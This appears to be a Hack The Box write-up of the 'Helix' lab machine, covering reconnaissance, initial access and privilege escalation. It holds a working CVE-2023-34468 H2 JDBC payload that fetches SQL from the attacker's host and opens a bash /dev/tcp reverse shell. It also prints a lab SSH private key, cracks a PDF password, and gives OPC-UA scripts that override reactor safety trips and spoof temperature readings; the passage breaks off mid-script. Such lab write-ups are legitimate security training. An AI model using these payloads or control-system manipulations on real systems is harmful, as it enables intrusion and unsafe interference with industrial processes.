---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - ApacheNiFi
  - CVE-2023-34468
  - JDBC
  - H2
  - RemoteCodeExecution
  - RCE
  - PDF
  - Cracking
  - JohnTheRipper
  - OPCUnifiedArchitecture
  - OPCUA
  - IndustrialControlSystems
  - ICS
  - SupervisoryControlAndDataAcquisition
  - SCADA
---
![](images/Helix.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Virtual Host (VHOST) Enumeration](#Virtual-Host-VHOST-Enumeration)
    - [Enumeration of flow.helix.htb](#Enumeration-of-flowhelixhtb)
- [Initial Access](#Initial-Access)
    - [CVE-2023-34468: H2 JDBC Remote Code Execution (RCE)](#CVE-2023-34468-H2-JDBC-Remote-Code-Execution-RCE)
- [Enumeration (nifi)](#Enumeration-nifi)
- [Privilege Escalation to operator](#Privilege-Escalation-to-operator)
- [user.txt](#usertxt)
- [Enumeration (operator)](#Enumeration-operator)
- [Cracking the Password for the PDF-File](#Cracking-the-Password-for-the-PDF-File)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [OPC-UA Reactor Manipulation](#OPC-UA-Reactor-Manipulation)
- [root.txt](#roottxt)

## Summary

The box exposes two services: `nginx` on port `80/TCP` redirecting to `helix.htb`, and `SSH` on port `22/TCP`. `Virtual Host` (`VHOST`) enumeration discovers a `flow.helix.htb` subdomain hosting an `Apache NiFi` instance at version `1.21.0`. The NiFi deployment has no authentication configured and is directly accessible, exposing the `DBCPConnectionPool` service to unauthenticated users.

`CVE-2023-34468` is exploited to achieve `Remote Code Execution` (`RCE`) via NiFi's `H2` `JDBC` database connection pool. NiFi allows configuring arbitrary `JDBC` connection strings, and the `H2` database driver accepts an `INIT` parameter that runs `SQL` on connection — including `RUNSCRIPT FROM`, which fetches and executes an external `SQL` file. For `Initial Access` a crafted `.sql` payload creates a stored procedure via `CREATE ALIAS` and immediately calls it to send a reverse shell, landing a shell as the `nifi` service account.

Enumeration of the NiFi installation directory reveals an `SSH` private key for the `operator` account stored in a `support-bundles` directory. The key is copied to the attacker machine and used to authenticate over `SSH` as `operator`, retrieving `user.txt`.

Enumeration as `operator` uncovers a `sudo` rule granting passwordless execution of `/usr/local/sbin/helix-maint-console`. Inspecting the binary reveals it is a `bash` script that checks for the existence of a state file `/opt/helix/state/maintenance_window` containing a future `Unix` timestamp — if valid, it spawns a root shell via `systemd-run`. The `operator` home directory contains two files of interest: a `control systems diagram` and a password-protected `PDF` titled `Operator Control & Safety Guide`. The `PDF` is cracked with `John the Ripper` and `rockyou.txt`, yielding the password `operator1`. The guide documents the reactor's `OPC-UA` node structure and specifies the conditions under which the maintenance window opens — temperature above `295 K` or pressure above `73 bar`.

An `OPC-UA` server is discovered listening on `localhost:4840`. A Python script using the `asyncua` library enumerates the reactor node tree (`Reactor`, `Safety`, `Control`) and a second script manipulates it: switching `Mode` to `MAINTENANCE`, enabling `TestOverride`, and incrementally ramping `CalibrationOffset` to artificially raise the reported temperature until the threshold is crossed. This causes the `plc` service to write the maintenance window timestamp to the state file. Running `sudo /usr/local/sbin/helix-maint-console` within the window spawns a `root` shell, and `root.txt` is retrieved.

## Reconnaissance

### Port Scanning

The initial `Nmap` scan revealed only two open ports: `22/TCP` (`SSH`) and `80/TCP` (`HTTP`). The `HTTP` service immediately redirected to `helix.htb`, which was added to `/etc/hosts`. The minimal attack surface directed attention straight to the web application.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.42.190
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-09 21:05 +0200
Nmap scan report for 10.129.42.190
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.42.190   helix.htb
```

### Enumeration of Port 80/TCP

`WhatWeb` identified a static marketing site titled `Helix Industries | Industrial Automation & Critical Infrastructure` running on `nginx 1.18.0`.

- [http://helix.htb/](http://helix.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://helix.htb/
http://helix.htb/ [200 OK] Country[RESERVED][ZZ], Email[name@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.42.190], Script, Title[Helix Industries | Industrial Automation & Critical Infrastructure], nginx[1.18.0]
```

![](images/2026-05-09_21-08_80_website.png)

### Virtual Host (VHOST) Enumeration

We used `ffuf` against `helix.htb` with a `Host` header fuzzing approach, filtering out the default `154`-byte response to isolate valid virtual hosts which revealed the `flow` subdomain.

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.helix.htb" -u http://helix.htb --fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://helix.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.helix.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1461ms]
:: Progress: [151265/151265] :: Job [1/1] :: 2439 req/sec :: Duration: [0:00:55] :: Errors: 0 ::
```

We also added `flow.helix.htb` to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.42.190   helix.htb
10.129.42.190   flow.helix.htb
```

### Enumeration of flow.helix.htb

Browsing `flow.helix.htb` revealed an `Apache NiFi` instance running at the `/nifi/` path. `WhatWeb` confirmed `jQuery`, `PasswordField`, and the `NiFi` title, but the application loaded without any authentication prompt — the instance had no login configured, giving unauthenticated access to the full `NiFi Flow Designer`. The `About` dialog identified the running version as `NiFi 1.21.0`.

- [http://flow.helix.htb/nifi/](http://flow.helix.htb/nifi/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://flow.helix.htb/nifi/
http://flow.helix.htb/nifi/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.42.190], JQuery, PasswordField, Script[text/javascript], Title[NiFi], UncommonHeaders[content-security-policy,x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

![](images/2026-05-09_21-11_80_flow_subdomain_nifi_flow_dashboard.png)

![](images/2026-05-09_21-12_80_flow_subdomain_nifi_flow_about_version.png)

## Initial Access

### CVE-2023-34468: H2 JDBC Remote Code Execution (RCE)

`CVE-2023-34468` is a `Remote Code Execution` (`RCE`) vulnerability in `Apache NiFi` versions prior to `1.23.0` that stems from the ability to configure `JDBC` database connection pools with arbitrary connection strings, including those targeting the embedded `H2` database engine. The `H2` `JDBC` driver supports an `INIT` parameter in the connection `URL` that executes arbitrary `SQL` statements at connection time. One particularly dangerous `H2` `SQL` construct is `RUNSCRIPT FROM '<URL>'`, which fetches and executes a remote `SQL` file. Combined with `H2`'s `CREATE ALIAS` statement — which allows defining a stored procedure backed by arbitrary `Java` code — this creates a full `RCE` primitive: the attacker hosts a `SQL` file that creates a `Java`-backed `SHELLEXEC` alias and immediately calls it, executing arbitrary shell commands in the context of the `NiFi` service process.

- [https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf](https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf)

The attack requires access to the `NiFi` `DBCPConnectionPool` controller service through the flow designer UI, which in this case was completely unauthenticated. We modified the `JDBC URL` to the following.

```shell
RUNSCRIPT FROM 'http://10.10.16.10:8000/rce.sql'
```

![](images/2026-05-09_21-32_80_flow_subdomain_nifi_flow_sql_select_query.png)

The `rce.sql` payload creates a `Java`-backed stored procedure that passes its argument to `bash -c` and returns the output, then immediately calls it with a reverse shell one-liner.

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/serve]
└─$ cat rce.sql 
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
  String[] command = {"bash", "-c", cmd};
  java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
  return s.hasNext() ? s.next() : "";
}
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.16.10/4444 0>&1')
```

A `Python` `HTTP` server served the `SQL` payload and confirmed the request was received from the target.

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/serve]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.42.190 - - [09/May/2026 21:34:53] "GET /rce.sql HTTP/1.1" 200 -
```

The reverse shell connected back as the `nifi` service account.

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.42.190] 42370
bash: cannot set terminal process group (975): Inappropriate ioctl for device
bash: no job control in this shell
nifi@helix:/opt/nifi-1.21.0$
```

The shell was upgraded to a full interactive `TTY` using `Python`'s `pty` module.

```shell
nifi@helix:/opt/nifi-1.21.0$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
nifi@helix:/opt/nifi-1.21.0$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 4444

nifi@helix:/opt/nifi-1.21.0$ 
nifi@helix:/opt/nifi-1.21.0$ export XTERM=xterm
nifi@helix:/opt/nifi-1.21.0$
```

## Enumeration (nifi)

Confirming identity showed `nifi` running as `uid=998` with no supplementary group memberships. Reviewing `/etc/passwd` identified three accounts with login shells: `root`, `operator` (uid `1001`) and `nifi` (uid `998`), as well as a `plc` service account (uid `997`) with home in `/opt/ot` that would later be relevant to the `OPC-UA` server.

```shell
nifi@helix:/opt/nifi-1.21.0$ id
id
uid=998(nifi) gid=998(nifi) groups=998(nifi)
```

```shell
nifi@helix:/opt/nifi-1.21.0$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
operator:x:1001:1001::/home/operator:/bin/bash
nifi:x:998:998::/opt/nifi:/usr/sbin/nologin
plc:x:997:997::/opt/ot:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
```

## Privilege Escalation to operator

Browsing the `NiFi` installation directory revealed a `support-bundles` subdirectory containing a backup of an `SSH` private key named `operator_id_ed25519.bak`.

```shell
nifi@helix:/opt/nifi-1.21.0/support-bundles$ ls -la
ls -la
total 12
drwxr-x---  2 nifi nifi 4096 May  5 10:18 .
drwxrwxr-x 16 nifi nifi 4096 May  5 10:18 ..
-rw-r-----  1 nifi nifi  411 Jan 25 13:15 operator_id_ed25519.bak
```

```shell
nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak
cat operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

The key was saved locally, permissions were set to `600`, and `SSH` was used to authenticate as `operator`.

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/files]
└─$ cat operator.id_ed25519 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/files]
└─$ chmod 600 operator.id_ed25519
```

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/files]
└─$ ssh -i operator.id_ed25519 operator@helix.htb
The authenticity of host 'helix.htb (10.129.42.209)' can't be established.
ED25519 key fingerprint is: SHA256:nGwNnXA5oCIEMCxZ3joJWy3usUFUt70Wqy72RayvMNA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'helix.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat May  9 08:35:15 PM UTC 2026

  System load:           0.17
  Usage of /:            86.8% of 6.52GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             257
  Users logged in:       0
  IPv4 address for eth0: 10.129.42.209
  IPv6 address for eth0: dead:beef::a0de:adff:fe8f:1404

  => / is using 86.8% of 6.52GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat May 9 20:35:16 2026 from 10.10.16.10
operator@helix:~$
```

## user.txt

```shell
operator@helix:~$ cat user.txt 
39c318a833913cb7c624b1738e763680
```

## Enumeration (operator)

Confirming identity showed `operator` running as `uid=1001` with no supplementary groups. `sudo -l` revealed a single rule granting passwordless execution of `/usr/local/sbin/helix-maint-console` as `root`. Running it immediately returned `Maintenance window CLOSED.`, indicating the binary enforces a prerequisite condition before granting the root shell.

```shell
operator@helix:~$ id
uid=1001(operator) gid=1001(operator) groups=1001(operator)
```

```shell
operator@helix:~$ sudo -l
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

```shell
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
Maintenance window CLOSED.
```

Inspecting the binary with `strings` revealed it is a `bash` script. The logic checks for a state file at `/opt/helix/state/maintenance_window` containing a future `Unix` timestamp. If the file exists and the timestamp has not expired, a root shell is launched via `systemd-run` in a transient scope — ensuring it is terminated automatically when the window expires.

```shell
operator@helix:~$ strings /usr/local/sbin/helix-maint-console | head -50
#!/bin/bash
set -euo pipefail
FLAG="/opt/helix/state/maintenance_window"
read_until() { cat "$FLAG" 2>/dev/null || true; }
window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))
echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"
# Unique scope name
SCOPE="helix-maint-$$"
# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i
# If systemd-run returns, the shell exited.
exit 0
```

Listing the `operator` home directory revealed two notable files: `control systems diagram.png` and `Operator Control & Safety Guide.pdf`. The `PDF` appeared password-protected. The `bash_history`, `.mysql_history` and `.viminfo` symlinks to `/dev/null` confirmed the environment had been hardened to prevent credential recovery from history files.

```shell
operator@helix:~$ ls -la
total 968
drwxr-x--- 5 operator operator   4096 May  5 10:18  .
drwxr-xr-x 3 root     root       4096 May  5 10:18  ..
lrwxrwxrwx 1 root     root          9 Apr 20 10:14  .bash_history -> /dev/null
-rw-r--r-- 1 operator operator    220 Jan  6  2022  .bash_logout
-rw-r--r-- 1 operator operator   3771 Jan  6  2022  .bashrc
drwx------ 3 operator operator   4096 May  5 10:18  .cache
-rw------- 1 operator operator 920611 Jan 26 16:15 'control systems diagram.png'
drwxrwxr-x 5 operator operator   4096 May  5 10:18  .local
lrwxrwxrwx 1 root     root          9 Jan 26 16:11  .mysql_history -> /dev/null
-rw-rw-r-- 1 operator operator  28453 Apr 16 08:50 'Operator Control & Safety Guide.pdf'
-rw-r--r-- 1 operator operator    807 Jan  6  2022  .profile
drwx------ 2 operator operator   4096 May  5 10:18  .ssh
-rw-r----- 1 root     operator     33 May  9 20:31  user.txt
lrwxrwxrwx 1 root     root          9 Jan 26 16:11  .viminfo -> /dev/null
```

We copied the `control systems diagram` to our attacker machine for further investigation.

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/files]
└─$ scp -i operator.id_ed25519 operator@helix.htb:/home/operator/'control systems diagram.png' .
control systems diagram.png                                                                                                                                                                                                                                                                                                                                                                             100%  899KB 263.7KB/s   00:03
```

![](images/control_systems_diagram.png)

We also downloaded the `PDF`  to crack it offline.

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/files]
└─$ scp -i operator.id_ed25519 operator@helix.htb:/home/operator/'Operator Control & Safety Guide.pdf' .
Operator Control & Safety Guide.pdf                                                                                                                                                                                                                                                                                                                                                                     100%   28KB  98.3KB/s   00:00
```

![](images/2026-05-09_22-44_password_protected_pdf.png)

`ss -tulpn` identified several locally-bound services that were not externally accessible. The most significant was port `4840/TCP` — the standard port for the `OPC-UA` (`OPC Unified Architecture`) protocol — listening on `localhost` only. Additional internal services were visible on ports `8080`, `8081`, and `33787` (all `NiFi`-related), as well as `38879`.

```shell
operator@helix:~$ ss -tulpn
Netid                                       State                                         Recv-Q                                        Send-Q                                                                                    Local Address:Port                                                                                Peer Address:Port                                       Process                                       
udp                                         UNCONN                                        0                                             0                                                                                         127.0.0.53%lo:53                                                                                       0.0.0.0:*                                                                                        
udp                                         UNCONN                                        0                                             0                                                                                               0.0.0.0:68                                                                                       0.0.0.0:*                                                                                        
tcp                                         LISTEN                                        0                                             50                                                                                            127.0.0.1:8080                                                                                     0.0.0.0:*                                                                                        
tcp                                         LISTEN                                        0                                             128                                                                                           127.0.0.1:8081                                                                                     0.0.0.0:*                                                                                        
tcp                                         LISTEN                                        0                                             100                                                                                           127.0.0.1:4840                                                                                     0.0.0.0:*                                                                                        
tcp                                         LISTEN                                        0                                             511                                                                                             0.0.0.0:80                                                                                       0.0.0.0:*                                                                                        
tcp                                         LISTEN                                        0                                             128                                                                                             0.0.0.0:22                                                                                       0.0.0.0:*                                                                                        
tcp                                         LISTEN                                        0                                             50                                                                                            127.0.0.1:33787                                                                                    0.0.0.0:*                                                                                        
tcp                                         LISTEN                                        0                                             4096                                                                                      127.0.0.53%lo:53                                                                                       0.0.0.0:*                                                                                        
tcp                                         LISTEN                                        0                                             50                                                                                   [::ffff:127.0.0.1]:38879                                                                                          *:*                                                                                        
tcp                                         LISTEN                                        0                                             128                                                                                                [::]:22                                                                                          [::]:*
```

## Cracking the Password for the PDF-File

`pdf2john` extracted the password hash from the `PDF` and `John the Ripper` cracked it against `rockyou.txt` in under two minutes, recovering the password `operator1`.

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/files]
└─$ pdf2john Operator\ Control\ \&\ Safety\ Guide.pdf > pdf.hash
```

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/Helix/files]
└─$ sudo john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
operator1        (Operator Control & Safety Guide.pdf)     
1g 0:00:01:54 DONE (2026-05-09 22:45) 0.008750g/s 2310p/s 2310c/s 2310C/s orphee..olivetree
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```

| Password  |
| --------- |
| operator1 |

## Privilege Escalation to root

The `Operator Control & Safety Guide` documented the reactor's control system architecture and the conditions under which the maintenance window opens. The guide specified that the `plc` process monitors reactor state via `OPC-UA` and writes a future timestamp to `/opt/helix/state/maintenance_window` — opening the maintenance window — when the reactor enters `MAINTENANCE` mode with `TestOverride` enabled and temperature or pressure exceeds a defined threshold (`≥ 295 K` or `≥ 73 bar`).

![](images/2026-05-09_22-47_operators_guide.png)

![](images/2026-05-09_22-49_operators_guide_maintenance_mode.png)

### OPC-UA Reactor Manipulation

`OPC-UA` (`OPC Unified Architecture`) is an industrial communication protocol widely used in `ICS` (`Industrial Control Systems`) and `SCADA` (`Supervisory Control and Data Acquisition`) environments. It provides a standardised, platform-independent interface for reading and writing process data — exposing sensors, actuators and control parameters as typed `nodes` organised in an address space. Each node is identified by a `NodeId` consisting of a namespace index and an identifier (e.g. `ns=2;i=4`). Nodes can be read, written, and browsed programmatically, making `OPC-UA` a direct interface to the underlying physical process simulation. In this case, the `plc` service exposes a reactor model with three node groups: `Reactor` (temperature and pressure readings), `Safety` (emergency systems), and `Control` (operating mode and override flags).

The Python `asyncua` library was used to enumerate the `OPC-UA` address space. The script connected to `opc.tcp://localhost:4840` and iterated over the three top-level namespace nodes, printing child node names, `NodeId`s, and current values.

```shell
operator@helix:~$ cat > /tmp/opcua_maint.py << 'EOF'
import asyncio
from asyncua import Client

async def main():
    url = "opc.tcp://localhost:4840"
    
    async with Client(url=url) as client:
        print("[+] Connected")
        
        # Enumerate Plant children
        for node_id in ["ns=2;i=2", "ns=2;i=7", "ns=2;i=11"]:
            node = client.get_node(node_id)
            name = await node.read_browse_name()
            print(f"\n[{name}] NodeId: {node_id}")
            children = await node.get_children()
            for child in children:
                cname = await child.read_browse_name()
                try:
                    val = await child.read_value()
                except:
                    val = "N/A"
                print(f"  {cname.Name} | {child.nodeid} | {val}")

asyncio.run(main())
EOF
```

The enumeration confirmed the full node structure and live sensor values — temperature at approximately `284 K`, pressure at approximately `69 bar`, and all safety systems inactive with the reactor in `NORMAL` mode.

```shell
operator@helix:~$ python3 /tmp/opcua_maint.py
[+] Connected

[QualifiedName(NamespaceIndex=2, Name='Reactor')] NodeId: ns=2;i=2
  TemperatureRaw | NodeId(Identifier=3, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | 283.9997948683006
  Temperature | NodeId(Identifier=4, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | 283.9997948683006
  Pressure | NodeId(Identifier=5, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | 68.99991964482064
  CalibrationOffset | NodeId(Identifier=6, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | 0.0

[QualifiedName(NamespaceIndex=2, Name='Safety')] NodeId: ns=2;i=7
  RodsInserted | NodeId(Identifier=8, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | False
  EmergencyCooling | NodeId(Identifier=9, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | False
  TripActive | NodeId(Identifier=10, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | False

[QualifiedName(NamespaceIndex=2, Name='Control')] NodeId: ns=2;i=11
  Mode | NodeId(Identifier=12, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | NORMAL
  TestOverride | NodeId(Identifier=13, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | False
  ResetTrip | NodeId(Identifier=14, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>) | False
```

With the node structure and threshold values confirmed from the guide, a second script was written to manipulate the reactor state. The attack sequence was: switch `Mode` from `NORMAL` to `MAINTENANCE` to signal the `plc` that a maintenance operation is in progress, enable `TestOverride` to suppress the automatic safety trip that would otherwise activate when thresholds are exceeded, then incrementally increment `CalibrationOffset` — which biases the reported `Temperature` reading upward — until `Temperature` reaches `295 K`. When the threshold is crossed, the `plc` detects the condition, validates `MAINTENANCE` mode and `TestOverride`, and writes the window timestamp to `/opt/helix/state/maintenance_window`.

```shell
operator@helix:~$ cat > /tmp/opcua_go.py << 'EOF'
import asyncio
from asyncua import Client
from asyncua.ua import DataValue, Variant, VariantType

async def main():
    url = "opc.tcp://localhost:4840"
    
    async with Client(url=url) as client:
        print("[+] Connected")

        mode_node     = client.get_node("ns=2;i=12")
        override_node = client.get_node("ns=2;i=13")
        offset_node   = client.get_node("ns=2;i=6")
        temp_node     = client.get_node("ns=2;i=4")
        pressure_node = client.get_node("ns=2;i=5")
        trip_node     = client.get_node("ns=2;i=10")

        # Step 1: Switch to MAINTENANCE
        print("[*] Setting Mode = MAINTENANCE")
        await mode_node.write_value(DataValue(Variant("MAINTENANCE", VariantType.String)))
        await asyncio.sleep(1)
        print(f"    Mode: {await mode_node.read_value()}")

        # Step 2: Enable TestOverride
        print("[*] Enabling TestOverride")
        await override_node.write_value(DataValue(Variant(True, VariantType.Boolean)))
        await asyncio.sleep(1)
        print(f"    TestOverride: {await override_node.read_value()}")

        # Step 3: Ramp CalibrationOffset slowly until window opens
        print("[*] Ramping CalibrationOffset...")
        offset = 0.0
        while True:
            trip     = await trip_node.read_value()
            temp     = await temp_node.read_value()
            pressure = await pressure_node.read_value()
            print(f"    Offset={offset:.1f} Temp={temp:.1f} Pressure={pressure:.1f} Trip={trip}")

            if trip:
